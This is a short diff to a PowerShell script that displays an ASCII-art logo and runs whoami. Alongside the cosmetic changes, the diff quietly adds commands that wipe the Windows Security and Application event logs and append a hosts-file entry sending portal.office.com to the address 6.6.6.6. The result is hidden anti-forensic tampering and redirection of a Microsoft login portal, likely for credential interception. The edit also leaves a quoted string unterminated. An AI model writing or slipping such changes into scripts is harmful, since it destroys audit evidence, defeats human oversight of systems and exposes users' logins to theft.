@@ -1,4 +1,3 @@
-  Clear-Host
   $logo = "
              ___
            /    \
@@ -15,5 +14,9 @@
          _\\    \\__
         (___|    \__)
 "
-Write-Output "`e[5;36m$logo`e[0m";
+wevtutil cl Security
+wevtutil cl Application
+echo 6.6.6.6 portal.office.com >> c:\windows\system32\drivers\etc\hosts
+Clear-Host
+Write-Output "$logo
 whoami
